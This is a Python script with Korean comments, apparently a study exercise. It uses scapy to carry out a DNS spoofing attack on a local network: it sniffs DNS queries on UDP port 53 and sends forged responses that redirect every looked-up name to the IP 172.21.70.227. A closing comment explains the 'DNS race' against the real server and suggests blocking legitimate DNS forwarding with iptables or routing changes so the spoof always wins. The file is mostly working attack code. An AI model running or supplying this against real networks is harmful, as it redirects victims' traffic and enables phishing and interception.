#DNS스푸핑은 공격자가 중간에서 DNS 쿼리패킷을 가로채어 질의한 IP를 조작한 후 DNS응답 패킷을 피해컴퓨터로 보내는 해킹기법이다.
#이 코드는 LAN에 연결된 컴퓨터에서 DNS쿼리 패킷을 가로채고 DNS응답 IP주소를 '172.21.70.227'로 변조한 후 DNS쿼리 패킷을 보낸 IP주소로 리턴하는 코드다.

from scapy.all import *

def dnsSpoof(packet):                        #sniff()의 패킷 처리 콜백 함수다. 이 함수에서 DNS패킷을 위조하여 DNS쿼리를 보낸 호스트로 응답하게 된다. 
    spoofDNS = '172.21.70.227'                #가로챈 DNS쿼리에 대한 응답 IP주소 
    dstip = packet[IP].src            #목적지 ip를 발신지 ip로
    srcip = packet[IP].dst            #발신지 ip를 목적지 ip로
    sport = packet[UDP].sport
    dport = packet[UDP].dport
    
    if packet.haslayer(DNSQR):            #만약 가로챈 패킷이 DNS쿼리를 가지고 있으면, 이에 대한 DNS응답 패킷을 실제로 생성하는 부분 
        dnsid = packet[DNS].id            #가로챈 패킷에서 id와 qd는 그대로 가져와서  DNS응답 패킷을 구성할 떄 사용. 
        qd = packet[DNS].qd
        dnsrr = DNSRR(rrname=qd.qname, ttl=10, rdata = spoofDNS)    #DNS응답 레코드인 DNSRR의 rdata에 변조한 응답 IP주소를 넣는다. 
        spoofPacket = IP(dst = dstip, src = srcip) / UDP(dport = sport, sport = dport) / DNS(id = dnsid, qd=qd, aa=1, qr=1, an=dnsrr)        #실제 DNS응답 패킷을 구성하는 부분 
        send(spoofPacket)
        print('+++ SOURCE[%s] -> DEST[%s]' %(dstip, srcip))
        print(spoofPacket.summary())
        
def main():
    print('+++DSN SPOOF START...')
    sniff(filter = 'udp port 53', store=0, prn=dnsSpoof)        #DNS 쿼리에 사용되는 UDP포트 53번으로 전송되는 데이터를 가로채서 dnsSpoof함수로 처리할 수 있도록 한다. 
    
if __name__ == '__main__':
    main()
        
        
        

'''
BUT 이건 완벽한 DNS 스푸핑 코드가 아니다
공격자가 변조한 DNS 응답 패킷과 실제 정상 DNS서버로부터 전송된 DNS 응답 패킷이 모두 피해 컴퓨터로 전달되었기 떄문에,
어느 것이 더 빨리 피해 컴퓨터로 응답하느냐에 따라 결과는 달라진다.
DNS쿼리에 대해 최초로 응답된 DNS패킷을 취하고 뒤에 도착한 DNS 응답 패킷은 버린다. 이것을 DNS경쟁 (DNS Race) 라고 한다. 
이를 해결하려면, IP테이블(or 라우팅 정책)을 수정하여 UDP 53번 포트로 포워딩되는 데이터를 따로 처리하여 정상 DNS로 가지 못하도록 하는 로직을 작성해야 한다., 
